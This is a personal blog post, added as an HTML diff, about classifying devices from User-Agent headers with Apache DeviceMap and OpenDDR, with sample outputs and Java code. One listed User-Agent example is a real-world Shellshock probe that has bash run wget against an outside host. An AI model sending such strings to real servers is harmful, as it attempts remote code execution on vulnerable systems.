@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Parsing User-Agent Strings with Apache DeviceMap</title>
+    <link rel="stylesheet" href="/css/bootstrap.css">
+    <link rel="stylesheet" href="/css/bootstrap-responsive.css">
+    <script src="/js/bootstrap.js"></script>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="/css/common.css">
+    <meta name="generator" content="nanoc 3.7.4">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/post.css">
+    <script type="text/javascript">
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-40183531-1']);
+      _gaq.push(['_trackPageview']);
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+    </script>
+  </head>
+  <body>
+    <div id="menu">
+      <div><a href="/">Home</a></div><div><a href="/about/">About</a></div><div><a href="/blog/">Blog</a></div><div><a href="/code/">Code</a></div><div><a href="/blog/feed/">Feed</a></div>
+    </div>
+    
+
+<div class="container">
+  <div class="row-fluid">
+    <div class="offset2 span8">
+      <div id="post" class="more-white-box rounded-corners">
+	<div class="head">
+	  <div class="title">Parsing User-Agent Strings with Apache DeviceMap</div>
+	  <div class="subtitle">posted at
+	    December 5, 2014
+	    with tags <a href="/blog/tag/java">java</a>
+	  </div>
+	  <div class="share">
+	    <div class="addthis_toolbox addthis_default_style ">
+	      <a class="addthis_button_preferred_1"></a>
+	      <a class="addthis_button_preferred_2"></a>
+	      <a class="addthis_button_preferred_3"></a>
+	      <a class="addthis_button_preferred_4"></a>
+	      <a class="addthis_button_compact"></a>
+	    </div>
+	    <script type="text/javascript">var addthis_config = {"data_track_addressbar":false};</script>
+	    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5144adf75211a62b"></script>
+	  </div>
+	</div>
+	<div class="body">
+
+	  
+<p>At work I am given the task of implementing a basic device profiler service to
+classify the incoming HTTP requests into a certain set of groups (desktop,
+tablet, mobile, etc.) using the
+<a href="http://en.wikipedia.org/wiki/User_agent">User-Agent</a> header. It opens a
+multitude of new dimensions both at the client- and server-side for interface
+and content customizations tailored to the device. For instance, you can
+disable some of your fancy gestures (e.g., <code>mouseover</code> events) that will not
+be properly used on a touch screen. Or you might want to prioritize console
+games for a client who uses a PlayStation to browse your shop.</p>
+
+<p>I first tried to investigate and (if possible) evaluate the existing solutions
+in the wild, including the commercial ones. And eventually decided to go with
+<a href="http://devicemap.apache.org/">Apache DeviceMap</a> that employs
+<a href="https://github.com/OpenDDRdotORG/OpenDDR-Resources">OpenDDR</a> in the
+background. In this blog post, I tried to wrap up a summary of the
+<em>experience</em> I collected through out this pursuit.</p>
+
+<h1 id="parsing-a-user-agent-string">Parsing a User-Agent string</h1>
+
+<p>While <a href="http://tools.ietf.org/html/rfc7231#section-5.5.3">Section 5.5.3</a> of
+<em>HTTP/1.1: Semantics and Content</em> specification has a lot to say about the
+formatting of the User-Agent header, the first thing for sure is that there
+are no restrictive rules that shape the header in a machine-readable format.
+Consider the following examples:</p>
+
+<ul>
+  <li>Mozilla/5.0 (Linux; Android 4.2.1; GT-H9500 Build/JOP40D) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/36.0.1985.131 Mobile Safari/537.36</li>
+  <li>Mozilla/5.0 (PlayStation Vita 3.18) AppleWebKit/536.26 (KHTML, like Gecko)
+Silk/3.2</li>
+  <li>Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-B5510B Build/GINGERBREAD)</li>
+  <li>Opera/9.50 (Nintendo DSi; Opera/507; U; en-GB)</li>
+</ul>
+
+<p>I can even show you more fancier ones:</p>
+
+<ul>
+  <li>MIKI50_6464_11B_24MP_HW
+(MRE/3.0.00(800);MAUI/51TV_V01_01_130227;BDATE/2013/02/27
+19:19;LCD/320240;CHIP/MT6250;KEY/QWERT;TOUCH/0;CAMERA/1;SENSOR/0;DEV/MIKI50_6464_11B_24MP_HW;WAP
+Browser/MAUI
+(HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;K)
+RLG_G51TV_V01_01_130227 Release/2013.02.27 WAP Browser/MAUI (HTTPS) Profile/
+Q03C1-2.40 en-US</li>
+  <li>Apache-HttpClient/4.1.3 (java 1.5)</li>
+  <li>WWW-Mechanize/1.73</li>
+  <li>Java/1.6.0_22</li>
+  <li>Scrapy/0.24.4 (+http://scrapy.org)</li>
+  <li>WordPress/3.1.3; http://www.unileverventures.com</li>
+</ul>
+
+<p>And some annoying ones:</p>
+
+<ul>
+  <li>LAVA.DISCOVER 137*.HEXING60A_COSMOS_11B_HW
+(MRE/3.1.00(1500);MAUI/308;BDATE/2013/11/20
+11:14;LCD/320480;CHIP/MT6260;KEY/Reduced;TOUCH/1;CAMERA/0;SENSOR/0;DEV/HEXING60A_COSMOS_11B_HW;WAP
+Browser/MAUI (HTTP
+PGDL;HTTPS);GMOBI/001;MBOUNCE/002;MOMAGIC/003;INDEX/004;SPICEI2I/005;GAMELOFT/006;MOBIM/007;KKF)
+11BW1308 Release/2013.11.20 WAP Browser/MAUI (HTTP PGDL; HTTPS)
+Profile/Profile/MIDP-2.0 Configuration/CLDC-1.1 Q03C1-2.40 en-US</li>
+  <li>shellshocker=’() { wget
+http://yourschool.net/.tmp/frogclog.php?http://www.ebay.com/ago-rari-1-43/1004004009042189/;
+}’ bash -c shellshocker</li>
+</ul>
+
+<p>So making a conclusion on which part denotes the product name, version, etc.
+is a fuzzy, tedious and error-prone task. That being said, there is another
+thing we can do here! Every User-Agent is more or less unique to the device
+that the software runs on. Hence, if we can come up with a database such that
+User-Agent strings are mapped to devices, we can employ this database to find
+the device of a certain User-Agent. This is where the term <a href="http://en.wikipedia.org/wiki/Device_Description_Repository">Device Description
+Repository</a> (DDR)
+kicks in:</p>
+
+<blockquote>
+  <p>The Device Description Repository is a concept proposed by the Mobile Web
+Initiative Device Description Working Group (DDWG) of the World Wide Web
+Consortium. The DDR is supported by a standard interface and an initial core
+vocabulary of device properties. Implementations of the proposed repository
+are expected to contain information about Web-enabled devices (particularly
+mobile devices).</p>
+</blockquote>
+
+<h1 id="the-rise-of-ddr">The Rise of DDR</h1>
+
+<p><a href="http://en.wikipedia.org/wiki/WURFL">WURFL</a> (Wireless Universal Resource FiLe)
+was the first community effort focused on mobile device detection and dates
+back to 2007. While WURFL was initially released under an “open source /
+public domain” license, in June 2011, project’s founders formed ScientiaMobile
+to provide commercial mobile device detection support and services using
+WURFL. As of now, the <a href="http://www.scientiamobile.com/">ScientiaMobile</a> WURFL
+APIs are licensed under a dual-license model, using the AGPL license for
+non-commercial use and a proprietary commercial license. In a world dominated
+by capitalism, the current version of the WURFL database itself is no longer
+open source. Inspired by WURFL and motivated by the gap in the market, it did
+not take much for alternative companies to emerge, including, but is not
+limited to, <a href="https://deviceatlas.com/">DeviceAtlas</a>, <a href="http://www.handsetdetection.com/">Handset
+Detection</a>, and
+<a href="http://51degrees.com/">51degrees</a>.</p>
+
+<p>So how far one can go using a DDR to detect the properties of a device by just
+looking at the User-Agent header? Below is a sample output that I collected
+from <a href="http://51degrees.com/">51degrees</a>:</p>
+
+<ul>
+  <li>HardwarePlatform
+    <ul>
+      <li>Camera
+        <ul>
+          <li>Has3DCamera: False</li>
+          <li>HasCamera: False</li>
+        </ul>
+      </li>
+      <li>Connectivity
+        <ul>
+          <li>HasNFC: False</li>
+        </ul>
+      </li>
+      <li>Device
+        <ul>
+          <li>DeviceType: Desktop</li>
+        </ul>
+      </li>
+      <li>Inputs
+        <ul>
+          <li>HasKeypad: False</li>
+          <li>HasQwertyPad: True</li>
+          <li>HasTouchScreen: False</li>
+          <li>HasTrackPad: True</li>
+          <li>HasVirtualQwerty: False</li>
+        </ul>
+      </li>
+      <li>Name
+        <ul>
+          <li>HardwareFamily: Macintosh</li>
+          <li>HardwareModel: Macintosh</li>
+          <li>HardwareName: Macintosh</li>
+          <li>HardwareVendor: Apple</li>
+          <li>OEM: Apple</li>
+        </ul>
+      </li>
+      <li>Screen
+        <ul>
+          <li>Has3DScreen: False</li>
+          <li>ScreenInchesDiagonalRounded: Unknown</li>
+          <li>ScreenInchesSquare: Unknown</li>
+          <li>ScreenMMDiagonalRounded: Unknown</li>
+          <li>ScreenMMSquare: Unknown</li>
+          <li>SuggestedImageButtonHeightMms: 3.5</li>
+          <li>SuggestedImageButtonHeightPixels: 11.8</li>
+          <li>SuggestedLinkSizePixels: 11.8</li>
+          <li>SuggestedLinkSizePoints: 10</li>
+        </ul>
+      </li>
+      <li>Stats
+        <ul>
+          <li>Popularity: 1674140546</li>
+        </ul>
+      </li>
+      <li>Tv
+        <ul>
+          <li>ContrastRatio: N/A</li>
+          <li>EnergyConsumptionPerYear: N/A</li>
+          <li>OnPowerConsumption: N/A</li>
+          <li>RefreshRate: N/A</li>
+        </ul>
+      </li>
+      <li>Miscellaneous
+        <ul>
+          <li>HardwareImages: Front, Posed</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>SoftwarePlatform
+    <ul>
+      <li>Ccpp
+        <ul>
+          <li>CcppAccept: application/java, application/java-archive,
+application/vnd.oma.dd+xml, application/vnd.oma.drm.content,
+application/vnd.oma.drm.message,
+application/vnd.oma.drm.rights+wbxml,
+application/vnd.oma.drm.rights+xml,
+application/vnd.wap.multipart.mixed, application/vnd.wap.wbxml,
+application/vnd.wap.wmlscriptc, application/vnd.wap.xhtml+xml,
+application/x-compress, application/x-gzip, application/xhtml+xml,
+audio/3ga, audio/3gpp, audio/aac, audio/amr, audio/asf, audio/asx,
+audio/awb, audio/m4a, audio/m4b, audio/midi, audio/mp3, audio/mp3d,
+audio/mp4, audio/MP4A-ES, audio/MP4A-LATM, audio/wav, audio/wma,
+image/2bp, image/bmp, image/gif, image/jpeg, image/jpg, image/png,
+image/tif, image/tiff, image/vnd.wap.wbmp, image/wbmp,
+message/rfc822, text/css, text/html, text/plain,
+text/vnd.sun.j2me.app-descriptor, text/vnd.wap.wml, text/x-ical,
+text/xml, text/xsl, text/x-vcal, video/3g2, video/3gp, video/3gpp,
+video/divx, video/flv, video/H263-2000, video/H264, video/m4v,
+video/mp4, video/MP4V-ES, video/wmv, video/xvid</li>
+        </ul>
+      </li>
+      <li>Name
+        <ul>
+          <li>PlatformName: Mac OS X</li>
+          <li>PlatformVendor: Apple</li>
+          <li>PlatformVersion: 10.9</li>
+          <li>BrowserUA: - Css</li>
+          <li>CssBackground: True</li>
+          <li>CssBorderImage: True</li>
+          <li>CssCanvas: True</li>
+          <li>CssColor: True</li>
+          <li>CssColumn: False</li>
+          <li>CssFlexbox: True</li>
+          <li>CssFont: True</li>
+          <li>CssImages: False</li>
+          <li>CssMediaQueries: True</li>
+          <li>CssMinMax: True</li>
+          <li>CssOverflow: True</li>
+          <li>CssPosition: True</li>
+          <li>CssText: False</li>
+          <li>CssTransforms: True</li>
+          <li>CssTransitions: True</li>
+          <li>CssUI: False</li>
+        </ul>
+      </li>
+      <li>Data
+        <ul>
+          <li>DataSet: True</li>
+          <li>DataUrl: True</li>
+        </ul>
+      </li>
+      <li>DOM
+        <ul>
+          <li>DeviceOrientation: False</li>
+        </ul>
+      </li>
+      <li>File
+        <ul>
+          <li>FileReader: True</li>
+        </ul>
+      </li>
+      <li>General
+        <ul>
+          <li>AjaxRequestType: Standard</li>
+          <li>AnimationTiming: True</li>
+          <li>BlobBuilder: True</li>
+          <li>BrowserPropertySource: Caniuse</li>
+          <li>FormData: True</li>
+          <li>Iframe: True</li>
+          <li>IndexedDB: True</li>
+          <li>jQueryMobileSupport: A-Grade</li>
+          <li>LayoutEngine: Blink</li>
+          <li>Masking: False</li>
+          <li>PostMessage: True</li>
+          <li>Prompts: True</li>
+          <li>Selector: True</li>
+          <li>TouchEvents: True</li>
+          <li>Track: True</li>
+        </ul>
+      </li>
+      <li>GPS
+        <ul>
+          <li>GeoLocation: True</li>
+        </ul>
+      </li>
+      <li>Html
+        <ul>
+          <li>Html-Media-Capture: True</li>
+          <li>HtmlVersion: 5.0</li>
+        </ul>
+      </li>
+      <li>Javascript
+        <ul>
+          <li>Javascript: True</li>
+          <li>JavascriptCanManipulateCSS: True</li>
+          <li>JavascriptCanManipulateDOM: True</li>
+          <li>JavascriptGetElementById: True</li>
+          <li>JavascriptSupportsEventListener: True</li>
+          <li>JavascriptSupportsEvents: True</li>
+          <li>JavascriptSupportsInnerHtml: True</li>
+          <li>JavascriptVersion: 1.8.5</li>
+        </ul>
+      </li>
+      <li>JSON
+        <ul>
+          <li>Json: True</li>
+        </ul>
+      </li>
+      <li>Name
+        <ul>
+          <li>BrowserName: Chrome</li>
+          <li>BrowserVendor: Google</li>
+          <li>BrowserVersion: 38</li>
+        </ul>
+      </li>
+      <li>Screen
+        <ul>
+          <li>Fullscreen: True</li>
+        </ul>
+      </li>
+      <li>Supported Media
+        <ul>
+          <li>SupportsTls/Ssl: True</li>
+          <li>Svg: True</li>
+          <li>Video: True</li>
+        </ul>
+      </li>
+      <li>ViewPort
+        <ul>
+          <li>Viewport: True</li>
+        </ul>
+      </li>
+      <li>Web
+        <ul>
+          <li>CookiesCapable: True</li>
+          <li>History: True</li>
+          <li>Progress: True</li>
+          <li>WebWorkers: True</li>
+          <li>Xhr2: True</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>Crawler
+    <ul>
+      <li>Miscellaneous
+        <ul>
+          <li>IsCrawler: False</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>Per see, what they can get by just looking at your User-Agent header is (to put
+it mildly) <em>a lot</em>!</p>
+
+<h1 id="long-live-foss">Long live F/OSS!</h1>
+
+<p>As usual, community’s response did not take long and the most recent open
+source version of WURFL (dating back to 2011) is forked under the
+<a href="https://github.com/OpenDDRdotORG/OpenDDR-Resources">OpenDDR</a> project. Later
+on, community kept updating the database by the effort of individual
+contributors.</p>
+
+<p>While OpenDDR file format allows hierarchical device representation as in
+WURFL, it rather maps each device to a set of attributes explicitly. To make a
+comparison, see how WURFL takes advantage of its hierarchical device
+representation:</p>
+
+<pre><code class="language-xml"><span class="nt">&lt;device</span> <span class="na">user_agent=</span><span class="s">"Nokia7110/1.0 (04"</span>
+        <span class="na">fall_back=</span><span class="s">"nokia_generic"</span>
+        <span class="na">id=</span><span class="s">"nokia_7110_ver1"</span><span class="nt">&gt;</span>
+    <span class="c">&lt;!-- ... --&gt;</span>
+    <span class="nt">&lt;group</span> <span class="na">id=</span><span class="s">"ui"</span><span class="nt">&gt;</span>
+        <span class="c">&lt;!-- ... --&gt;</span>
+        <span class="nt">&lt;capability</span> <span class="na">name=</span><span class="s">"table_support"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;/group&gt;</span>
+<span class="nt">&lt;/device&gt;</span>
+
+<span class="nt">&lt;device</span> <span class="na">user_agent=</span><span class="s">"Nokia7110/1.0 (04.67)"</span>
+        <span class="na">fall_back=</span><span class="s">"nokia_7110_ver1"</span>
+        <span class="na">id=</span><span class="s">"nokia_7110_ver1_sub467"</span> <span class="nt">/&gt;</span> 
+
+<span class="nt">&lt;device</span> <span class="na">user_agent=</span><span class="s">"Nokia7110/1.0 (04.69)"</span>
+        <span class="na">fall_back=</span><span class="s">"nokia_7110_ver1"</span>
+        <span class="na">id=</span><span class="s">"nokia_7110_ver1_sub469"</span> <span class="nt">/&gt;</span> 
+
+<span class="c">&lt;!-- ... --&gt;</span>
+
+<span class="nt">&lt;device</span> <span class="na">user_agent=</span><span class="s">"Nokia7110/1.0 (04.94)"</span>
+        <span class="na">fall_back=</span><span class="s">"nokia_7110_ver1"</span>
+        <span class="na">id=</span><span class="s">"nokia_7110_ver1_sub494"</span> <span class="nt">/&gt;</span> 
+
+<span class="c">&lt;!-- 7110 new-age --&gt;</span>
+<span class="nt">&lt;device</span> <span class="na">user_agent=</span><span class="s">"Nokia7110/1.0 (05"</span>
+        <span class="na">fall_back=</span><span class="s">"nokia_7110_ver1"</span>
+        <span class="na">id=</span><span class="s">"nokia_7110_ver2"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;group</span> <span class="na">id=</span><span class="s">"ui"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;capability</span> <span class="na">name=</span><span class="s">"table_support"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;/group&gt;</span>
+<span class="nt">&lt;/device&gt;</span>
+
+<span class="nt">&lt;device</span> <span class="na">user_agent=</span><span class="s">"Nokia7110/1.0 (05.00)"</span>
+        <span class="na">fall_back=</span><span class="s">"nokia_7110_ver2"</span> 
+        <span class="na">id=</span><span class="s">"nokia_7110_ver1_sub500"</span> <span class="nt">/&gt;</span>
+
+<span class="nt">&lt;device</span> <span class="na">user_agent=</span><span class="s">"Nokia7110/1.0 (05.01)"</span>
+        <span class="na">fall_back=</span><span class="s">"nokia_7110_ver2"</span>
+        <span class="na">id=</span><span class="s">"nokia_7110_ver1_sub501"</span> <span class="nt">/&gt;</span></code></pre>
+
+<p>On the other hand, OpenDDR follows a more flat model:</p>
+
+<pre><code class="language-xml"><span class="nt">&lt;device</span> <span class="na">id=</span><span class="s">"SAMSUNG-SGH-i780"</span> <span class="na">parentId=</span><span class="s">"genericSamsung"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"model"</span> <span class="na">value=</span><span class="s">"SGH-i780"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"displayWidth"</span> <span class="na">value=</span><span class="s">"320"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"displayHeight"</span> <span class="na">value=</span><span class="s">"320"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"mobile_browser"</span> <span class="na">value=</span><span class="s">"Microsoft Mobile Explorer"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"mobile_browser_version"</span> <span class="na">value=</span><span class="s">"7.7"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"device_os"</span> <span class="na">value=</span><span class="s">"Windows Mobile OS"</span><span class="nt">/&gt;</span>
+    <span class="c">&lt;!-- ... --&gt;</span>
+<span class="nt">&lt;/device&gt;</span>
+<span class="nt">&lt;device</span> <span class="na">id=</span><span class="s">"sholest"</span> <span class="na">parentId=</span><span class="s">"genericMotorola"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"model"</span> <span class="na">value=</span><span class="s">"XT701"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"marketing_name"</span> <span class="na">value=</span><span class="s">"Sholes Tablet"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"displayWidth"</span> <span class="na">value=</span><span class="s">"480"</span><span class="nt">/&gt;</span>
+    <span class="c">&lt;!-- ... --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_support_getelementbyid"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_support_inner_html"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_manipulate_dom"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_manipulate_css"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_support_events"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_support_event_listener"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"image_inlining"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"from"</span> <span class="na">value=</span><span class="s">"open_db_modified"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/device&gt;</span>
+<span class="nt">&lt;device</span> <span class="na">id=</span><span class="s">"bravo"</span> <span class="na">parentId=</span><span class="s">"genericHTC"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"model"</span> <span class="na">value=</span><span class="s">"A8183"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"marketing_name"</span> <span class="na">value=</span><span class="s">"Bravo"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"displayWidth"</span> <span class="na">value=</span><span class="s">"480"</span><span class="nt">/&gt;</span>
+    <span class="c">&lt;!-- ... --&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_manipulate_css"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_support_events"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"ajax_support_event_listener"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"image_inlining"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"from"</span> <span class="na">value=</span><span class="s">"open_db_modified"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;/device&gt;</span></code></pre>
+
+<h1 id="apache-devicemap">Apache DeviceMap</h1>
+
+<p>While DDR exposes you an almost exhaustive set of device vendors, models, and
+attributes, it does not provide you a search mechanism in this swamp. <a href="http://devicemap.apache.org/">Apache
+DeviceMap</a> (which is graduating from incubation
+as of this writing) is a project that fills this gap. DeviceMap basically
+ships two fundamental Maven artifacts: an OpenDDR clone (<code>devicemap-data</code>) and
+a driver (<code>devicemap-client</code>) available for Visual Basic, C# and Java
+programming languages.</p>
+
+<p>Usage of Apache DeviceMap is pretty straigt forward. You first include
+necessary set of dependencies in your POM file:</p>
+
+<pre><code class="language-xml"><span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.devicemap<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>devicemap-data<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>1.0.2-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.devicemap<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>devicemap-client<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>1.1.0-SNAPSHOT<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span></code></pre>
+
+<p>And then enjoy the API exposed by the driver:</p>
+
+<pre><code class="language-java"><span class="kn">import</span> <span class="nn">org.apache.devicemap.DeviceMapClient</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.devicemap.loader.LoaderOption</span><span class="o">;</span>
+
+<span class="c1">// Create a DeviceMapClient instance.</span>
+<span class="n">DeviceMapClient</span> <span class="n">deviceMapClient</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">DeviceMapClient</span><span class="o">();</span>
+<span class="n">deviceMapClient</span><span class="o">.</span><span class="na">initDeviceData</span><span class="o">(</span><span class="n">LoaderOption</span><span class="o">.</span><span class="na">JAR</span><span class="o">);</span>
+
+<span class="c1">// Try to classify a sample User-Agent parameter using the DeviceMapClient.</span>
+<span class="n">String</span> <span class="n">desc</span> <span class="o">=</span> <span class="s">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) "</span> <span class="o">+</span>
+              <span class="s">"AppleWebKit/537.36 (KHTML, like Gecko) "</span> <span class="o">+</span>
+              <span class="s">"Chrome/38.0.2125.104 Safari/537.36"</span><span class="o">:</span>
+<span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">attrs</span> <span class="o">=</span> <span class="n">deviceMapClient</span><span class="o">.</span><span class="na">classify</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>
+
+<span class="c1">// Dump found attributes.</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">attrs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+    <span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">attr</span> <span class="o">:</span> <span class="n">attrs</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"%s = %s\n"</span><span class="o">,</span> <span class="n">attr</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">attr</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span></code></pre>
+
+<p>In the following you can find the output of the above snippet:</p>
+
+<pre><code>displayHeight = 600
+ajax_support_inner_html = true
+mobile_browser_version = -
+is_tablet = false
+ajax_support_getelementbyid = true
+ajax_support_javascript = true
+ajax_manipulate_dom = true
+ajax_manipulate_css = true
+vendor = -
+model = -
+id = desktopDevice
+mobile_browser = -
+is_bot = false
+nokia_edition = 0
+is_wireless_device = false
+ajax_support_event_listener = true
+device_os = -
+inputDevices = -
+nokia_series = 0
+ajax_support_events = true
+xhtml_format_as_css_property = false
+displayWidth = 800
+marketing_name = -
+image_inlining = false
+device_os_version = -
+xhtml_format_as_attribute = false
+is_desktop = true
+dual_orientation = false
+</code></pre>
+
+<p>Per see, the output is not much detailed as the one we got from 51degrees.
+Almost all of the crucial data is missing and there are some mistakes in
+certain entries like display width and height. That being said, it got three
+important bits right: <code>is_desktop</code>, <code>is_bot</code>, and <code>is_tablet</code>. Note that there
+does not exist much of a mechanism to verify the correctness of the attributes
+returned by the employed engine. That is, the nature of the problem also
+implies the absance of a verification mechanism.</p>
+
+<h1 id="the-grand-decision">The Grand Decision</h1>
+
+<p>If you had a chance to check out the website of the commercial DDR and
+User-Agent detection solutions, you should have noticed the giant IT leaders
+(Google, Facebook, PayPal, etc.) in their customers list. Hence, it was a
+little bit tempting to go with a commercial solution. That being said, I also
+wanted to evaluate the performance of the Apache DeviceMap. For that purpose,
+I collected a couple of months worth visitor data at work and tried to resolve
+User-Agent headers. The results were very promising and Apache DeviceMap
+succeeded to resolve almost 90% of all the collected User-Agent strings. That
+beign said, resolving a User-Agent – that is, matching the given User-Agent
+against DDR and returning a set of attributes – does not imply the
+correctness of the returned attributes. Nevertheless, I repeated the same
+experiment with almost two dozens of different devices at work and it
+succeeded in almost everyone.</p>
+
+<p>Since the project that I am working on is still in its early stages and the
+initial results are more than satisfactory, we concluded to go with Apache
+DeviceMap. Further, we managed to increase its coverage up to 99% by
+introducing some entries manually to do the database. Indeed, we
+<a href="https://issues.apache.org/jira/browse/DMAP-104?jql=reporter%20in%20(vy)">reported</a>
+a majority of those enhancements back to the Apache DeviceMap project.</p>
+
+
+	  <script type="text/javascript">
+	    $("#post table").attr("class", "table table-hover");
+	  </script>
+
+	  <div id="disqus_thread"></div>
+	  <script type="text/javascript">
+	  var disqus_shortname = 'vyazici';
+	  var disqus_identifier = '/blog/post/20141205-apache-devicemap/';
+	  var disqus_title = 'Parsing User-Agent Strings with Apache DeviceMap';
+	  (function() {
+	  	var dsq = document.createElement('script');
+	  	dsq.type = 'text/javascript';
+	  	dsq.async = true;
+	  	dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+	  	(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	  })();
+	  </script>
+
+	</div>
+      </div>
+      <div id="bgauthor" class="narrow-font">
+	background image by
+	<a href="http://jenniferwetzel.com/">Jennifer Wetzel</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+
+  </body>
+</html>
+
